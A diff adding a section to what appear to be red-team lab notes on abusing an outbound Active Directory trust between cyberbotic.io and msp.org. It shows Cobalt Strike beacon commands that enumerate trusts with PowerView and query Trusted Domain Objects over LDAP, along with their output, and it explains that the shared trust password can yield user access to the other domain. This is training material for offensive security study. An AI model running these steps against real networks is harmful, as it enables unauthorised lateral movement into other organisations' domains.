@@ -427,3 +427,47 @@ An outbound trust exists between `cyberbotic.io` and `msp.org`.
 
 The direction of trust is such that `cyberbotic.io` trusts `msp.org` (so users of `msp.org` can access resources in `cyberbotic.io`).
 
+{% hint style="info" %}
+Because `DEV` has trust with `CYBER`, we can <mark style="color:yellow;">query the trusts</mark> that it has by adding the `-Domain` parameter.
+
+**(See below):**
+{% endhint %}
+
+```
+beacon> getuid
+[*] You are DEV\bfarmer
+
+beacon> powershell Get-DomainTrust -Domain cyberbotic.io
+
+SourceName      : cyberbotic.io
+TargetName      : msp.org
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FILTER_SIDS
+TrustDirection  : Outbound
+WhenCreated     : 8/16/2022 9:49:17 AM
+WhenChanged     : 8/16/2022 9:49:17 AM
+```
+
+As a result, we can still partially exploit this trust and obtain "domain user" access from `CYBER` to `MSP` by leveraging the shared credential for the trust.
+
+Both domains in a trust relationship will store a shared password (which gets changed every 30 days) in a Trusted Domain Object (TDO).
+
+These objects are stored in the system container and can be read via LDAP.
+
+**Here, we can see that the DC in `CYBER` has two TDOs for its trusts with `DEV` and `MSP`:**
+
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
+
+[*] TOTAL NUMBER OF SEARCH RESULTS: 2
+	[+] distinguishedName : CN=dev.cyberbotic.io,CN=System,DC=cyberbotic,DC=io
+	[+] name              : dev.cyberbotic.io
+	[+] flatName          : DEV
+	[+] trustDirection    : 3
+
+	[+] distinguishedName : CN=msp.org,CN=System,DC=cyberbotic,DC=io
+	[+] name              : msp.org
+	[+] flatName          : MSP
+	[+] trustDirection    : 2
+```
+
